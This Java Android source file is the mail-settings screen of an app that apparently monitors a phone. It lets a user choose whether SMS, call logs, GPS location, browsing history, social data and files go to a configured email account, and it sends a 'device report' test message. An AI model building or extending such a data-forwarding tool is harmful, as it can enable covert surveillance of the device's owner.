package com.dwreload.activity;

import java.io.File;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import com.dwreload.R;
import com.dwreload.SettingsManager;
import com.dwreload.modules.mail.SendMail;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Toast;

public class MailerActivity extends Activity {
	private SettingsManager settings;
	private Context mContext;
	

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_mail);
		
		settings = new SettingsManager(this);
		Refresh();
		mContext = this.getApplicationContext();

	}
	
	@Override
	protected void onResume() {
		Refresh();
		super.onResume();
	}
	
	@Override
	protected void onPause()
		{
		SaveSettings();
		super.onPause();
		}
	
	private void SaveSettings()
		{
		CheckBox sms   = (CheckBox) findViewById(R.id.smstomail);
		CheckBox calls = (CheckBox) findViewById(R.id.callstomail);
		EditText adr   = (EditText) findViewById(R.id.emailaddr);
		EditText pwd   = (EditText) findViewById(R.id.mailuserpass);
		EditText server  = (EditText) findViewById(R.id.popserveraddr);
		
		settings.sendSmstomail(sms.isChecked());
		settings.sendCallToMail(calls.isChecked());
		settings.email(adr.getText().toString());
		settings.email_server(server.getText().toString());
		settings.email_userpass(pwd.getText().toString());
		//settings.email_username(adr.getText().toString());
		}
	
	private void Refresh()
		{
			
		CheckBox sms   = (CheckBox) findViewById(R.id.smstomail);
		sms.setChecked(settings.sendSmstomail());
		sms.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.sendSmstomail(isChecked);
				}
			});
		
		CheckBox cll   = (CheckBox) findViewById(R.id.callstomail);
		cll.setChecked(settings.sendCallToMail());
		cll.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.sendCallToMail(isChecked);
				}
			});
		
		CheckBox gps   = (CheckBox) findViewById(R.id.GPStoMail);
		gps.setChecked(settings.sendGpsToMail());
		gps.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.sendGpsToMail(isChecked);
				}
			});
		
		CheckBox his   = (CheckBox) findViewById(R.id.HistoryToMail);
		his.setChecked(settings.sendHistoryToMail());
		his.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.sendHistoryToMail(isChecked);
				}
			});
		
		CheckBox social   = (CheckBox) findViewById(R.id.CB_Social);
		social.setChecked(settings.sendSocialToMail());
		social.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.sendSocialToMail(isChecked);
				}
			});
		
		CheckBox other   = (CheckBox) findViewById(R.id.AllOtherToMail);
		other.setChecked(settings.sendAllOtherToMail());
		other.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.sendAllOtherToMail(isChecked);
				}
			});
		
		CheckBox files   = (CheckBox) findViewById(R.id.FilesToMail);
		files.setChecked(settings.SendFilesToMail());
		files.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
			{
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
				{
				settings.SendFilesToMail(isChecked);
				}
			});
		
		EditText adr   = (EditText) findViewById(R.id.emailaddr);
	    adr.setText(settings.email());
		EditText pwd   = (EditText) findViewById(R.id.mailuserpass);
		pwd.setText(settings.email_userpass());
		EditText serv  = (EditText) findViewById(R.id.popserveraddr);		
		serv.setText(settings.email_server());
		

	    adr.addTextChangedListener(new TextWatcher()
	    	{
	        public void afterTextChanged(Editable s)
	        	{
	        	EditText serv  = (EditText) findViewById(R.id.popserveraddr);	
	        	String domen = s.toString();
	        	int ind = domen.indexOf("@");
	        	if (ind >=1)
	        		{
	        		domen = domen.substring(ind+1);
	        		serv.setText("smtp."+ domen);
	        		}
	        	}
	        @Override
			public void beforeTextChanged(CharSequence s, int start, int count,int after){}
			@Override
			public void onTextChanged(CharSequence s, int start, int before, int count){}    
	    	});
	    
	    final Button testbutton = (Button) findViewById(R.id.testmailbutton);
		testbutton.setOnClickListener(new View.OnClickListener()
			{
			public void onClick(View v)
				{
				testbutton.setClickable(false);
				Toast.makeText(mContext, R.string.testmail, Toast.LENGTH_SHORT).show();
				TestMail();
				testbutton.setClickable(true);
				}
			});
		
	}	
	
	private void TestMail()
		{
		String subj;
		String body;
		Boolean res = false;
		SaveSettings();
		ArrayList<File> dummyfile = null;
		//dummyfile.clear();
		
		subj = ("Device with ID: " + settings.PhoneName() + " report - It Works!");
		body = "Congratulations! Your mail settings are correct!";
		SendMail sm = new SendMail(mContext,dummyfile);
		sm.execute(subj, body);
		try
			{
			res = sm.get(90, TimeUnit.SECONDS);
			} 
		catch (Exception e)
			{
			res = false;
			}
		if (res) Toast.makeText(mContext, R.string.success, Toast.LENGTH_LONG).show();
		else Toast.makeText(mContext, R.string.error, Toast.LENGTH_LONG).show();
		}
}